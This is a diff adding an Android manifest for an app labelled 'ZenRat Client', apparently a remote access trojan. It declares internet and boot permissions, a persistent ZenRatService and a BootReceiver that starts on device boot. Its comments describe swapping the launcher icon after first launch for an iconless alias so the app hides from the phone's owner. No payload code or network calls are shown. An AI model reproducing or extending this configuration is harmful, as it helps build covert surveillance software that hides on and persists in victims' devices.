@@ -1,0 +1,48 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+
+    <application
+        android:label="ZenRat Client"
+        android:theme="@android:style/Theme.DeviceDefault">
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
+            <!-- This is the main activity, but it's not the launcher itself -->
+        </activity>
+
+        <!-- This is the alias that will be shown in the launcher initially -->
+        <activity-alias
+            android:name=".LauncherActivity"
+            android:targetActivity=".MainActivity"
+            android:exported="true"
+            android:label="ZenRat Client">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- This is the alias that will be enabled after the first launch (and has no icon) -->
+         <activity-alias
+            android:name=".MainActivityAlias"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="false">
+        </activity-alias>
+
+        <service android:name=".core.ZenRatService" />
+
+        <receiver android:name=".core.BootReceiver" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+
+</manifest>
